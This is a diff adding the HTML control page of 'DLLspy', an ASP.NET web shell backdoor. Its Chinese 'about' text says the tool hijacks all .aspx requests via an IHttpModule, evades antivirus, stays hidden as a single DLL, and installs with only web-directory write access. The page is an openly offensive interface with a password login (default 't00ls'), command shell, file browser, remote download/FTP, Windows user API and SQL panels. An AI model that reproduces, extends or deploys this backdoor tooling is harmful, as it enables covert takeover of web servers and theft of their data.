@@ -1,0 +1,143 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head id="Head1">
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<title>DLLspy</title>
+<script type="text/javascript"  src="js/jquery-1.4.2.min.js"></script>
+<script type="text/javascript"  src="jquery.jqDock.js"></script>
+<script type="text/javascript"  src="js/jquery.jqDock.min.js"></script>
+<script type="text/javascript"  src="js/DLLStyle.js"></script>
+<script type="text/javascript" src="js/xmlhttps.js"></script>
+
+<link href="css/default.css" type="text/css" rel="stylesheet" />
+</head>
+<body style="margin:0;table-layout:fixed;">
+
+<input type="hidden" id="adminurl"   value=""/>
+<input type="hidden" id="adminpass"   value=""/>
+<input type="hidden" id="IndexDir"   value=""/>
+<input type="hidden" id="WebRootDir"   value=""/>
+<div id="ShellPanal">
+
+<div id="MenuPanal"  style="display:none;">
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+<tr class="head">
+<td ><span style="float:right;" id="DLLBanner">#</span><span id="ServerIp">127.0.0.1:80(localhost)</span><span style="margin-left:20px;" id="ServerFrameWork"  ></span></td>
+</tr>
+<tr class="alt1">
+<td>
+<div>
+<div id='menu'   style="margin-bottom:30px;">
+	<a href='#' title='' onclick="GetDiv('systeminfo');"><img    src="img/win.png" alt='' title='系统信息' /></a>
+	<a href='#'   title=''  onclick="GetDiv('NETPanal');" ><img    src="img/htm.png" alt='' title=''/></a>
+  	<a href='#' title=''  onclick="GetDiv('FileExplore');" ><img   src="img/doc.png" alt='' title='' /></a>
+  	<a href='#' title='' onclick="GetDiv('cmdshell');" ><img   src="img/Terminal.png" alt='' title=''/></a>
+	<a href='#' title=''  onclick="GetDiv('FileSearchPanal');" ><img    src="img/Search.png" alt='文件搜索' title='文件搜索' /></a>
+    <a href='#' title='' onclick="GetDiv('GzipPanal');" ><img    src="img/music.png" alt='压缩&解压' title='压缩&解压' /></a>
+    <a href='#' title='' onclick="GetDiv('IISspyPanal');" ><img    src="img/Connect.png" alt='IISspy' title='IISspy' /></a>
+    <a href='#' title='' onclick="GetDiv('WinUserAPIPanal');" ><img    src="img/System.png" alt='WinUserAPI' title='WinUserAPI' /></a>
+    <a href='#' title='' onclick="GetDiv('SQLControlPanal');" ><img    src="img/Trash.png" alt='SqlManager' title='SqlManager' /></a>
+    <a href='#' title='' onclick="GetDiv('SQLControlPanal');" ><img    src="img/Pictures.png" alt='SqlManager' title='SqlManager' /></a>
+  	<a href='#' title='' onclick="GetDiv('aboutMe');"><img  alt='关于作者' title='关于作者'    src="img/eMail.png" alt='' title='' /></a>
+    
+</div>
+</td></tr></table>
+</div>
+
+<!--登陆-->
+<div id="showme">
+ URL:<input  id="LoginUrl"  type="text" class="input" value="http://localhost:3098/test/Default.aspx"  size="100" /><br>
+ PWD:<input  id="ShellPassWord" type="password" value="t00ls" class="input"  /> 
+ <input type="button" name="ShellLogin" value="Submit" id="ShellLogin" class="bt"   onclick="LoginAction();"/> 
+
+</div>
+
+<div id="LoadInc" name="LoadInc" style="display:none;"></div>
+
+<!--CMD命令-->
+<div id="BackShow" name="BackShow" class="CmdDiv"  style="margin-top:15px;margin-left:15px;margin-right:15px;background-color:#000;color:#0F0;font-weight:bold;"></div>
+
+<!--文件浏览操作-->
+<div id="PathPanal" name="PathPanal" class="CmdDiv"    style="margin-top:15px;margin-left:15px;margin-right:15px;font-weight:bold;"></div>
+<div id="FileExplore" name="FileExplore" class="CmdDiv"  style="margin-top:15px;margin-left:15px;margin-right:15px;font-weight:bold;"></div>
+
+<!--文件打包-->
+<div id="GzipPanal" name="GzipPanal" class="CmdDiv"    style="margin-top:15px;margin-left:15px;margin-right:15px;font-weight:bold;"></div>
+
+<!--文件搜索--> 
+<div id="FileSearchPanal" name="FileSearchPanal" class="CmdDiv"    style="margin-top:15px;margin-left:15px;margin-right:15px;font-weight:bold;"></div>
+
+<!--IISspy--->
+<div id="IISspyPanal" name="IISspyPanal" class="CmdDiv"    style="margin-top:15px;margin-left:15px;margin-right:15px;font-weight:bold;"></div>
+
+<!--远程下载和FTP--->
+<div id="NETPanal" name="NETPanal" class="CmdDiv"    style="display:none;margin-top:15px;margin-left:15px;margin-right:15px;font-weight:bold;"></div>
+
+ 
+<!--windows用户API操作-->
+<div id="WinUserAPIPanal" name="WinUserAPIPanal" class="CmdDiv"    style="display:none;margin-top:15px;margin-left:15px;margin-right:15px;font-weight:bold;">
+</div>
+
+
+<!--关于作者--->
+<div id="aboutMe" name="aboutMe" class="CmdDiv"    style="display:none;margin-top:15px;margin-left:15px;margin-right:15px;font-weight:bold;">
+这个玩意儿是很久之前的整的。不过因为这段时间一直荒废着，所以发出来，希望有能力的家伙一起完成。<br>
+DLLspy，绝对免杀，隐藏，HTTP请求劫持，居家旅行，杀人放火必备良药。有时间我会继续开发的，有啥子问题可以直接联系我<br>
+因为采用了html+js作为客户端，所以浏览器兼容的问题很让我蛋疼啊，现在只支持IE，火狐不行，其余不知道<p><p><p>
+原理：通过IHttpModule,相当于劫持了所有.aspx的请求(只要是经过.NET处理的都可以)<br>
+特点：采用了多线程，采用直接调用系统API,绝对免杀,杀毒软件是无法识别其DLL的，因为DLL不是win32代码，而是中间语言（IL）<br>
+隐藏：没有任何aspx文件，仅仅是一个DLL，安装此后门仅仅只需要web目录的可写权限。不需要系统权限<br>
+新功能:后台多线程文件搜索（搜win32目录会报错，不过搜网站目录一点问题都没），适合大型搜索，解决了搜索超时的问题，文件无组件打包压缩。<br>
+
+<p>
+<p>
+<p>
+<b>博客：http://www.cnblogs.com/zpino     邮箱:zpino@126.com</b>
+</div>
+
+<!--数据库操作-->
+<div id="SQLControlPanal" name="SQLControlPanal" class="CmdDiv"    style="display:none;margin-top:15px;margin-left:15px;margin-right:15px;font-weight:bold;">
+<table>
+<tr><td></td>
+<td><b>SQL controls</b></td>
+</tr>
+
+<tr><td>SQL Source:</td>
+<td>
+<select class="something" id="SqlType" name="SqlType" onchange="SqlTypeChange();">
+<option    selected="selected" value="sqlserver">Sql Server</option>
+<option    value="mysql">Mysql</option>
+<option    value="access">Access</option>
+</select>
+</td>
+</tr>
+
+<tr><td>ConnectString:</td>
+<td><input  id="ConnStr" name="ConnStr"  type="text" class="input" value="Data Source=8.8.8.18;Network Library=DBMSSOCN;Initial Catalog=NorthWind;User ID=sa;Password=123324;"  size="100" /></td>
+</tr>
+
+<tr><td>SQL Text:</td>
+<td>
+<textarea  id="SqlText" name="SqlText"     style="width:100%;height:150px;"  >select user as 'Current User',@@version as 'Banner'</textarea>
+</tr>
+
+<tr><td></td>
+<td><input type="button" name="SQlexe" value="EXEC" id="SQlexe" class="bt"   onclick="ConnSQL();"/>
+<div id="SQLDataTable" name="SQLDataTable"></div></td>
+</tr>
+</table>
+
+</div>
+
+
+
+
+
+
+</div>
+ <div    style="width:100%;padding:8px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright &copy; 2010-2010 <a href="http://www.cnblogs.com/zpino/" target="_blank">fucker'Blog</a> All Rights Reserved.</div>
+ <script type="text/javascript">
+ LoadFunction();
+ </script>
+</body>
+</html>
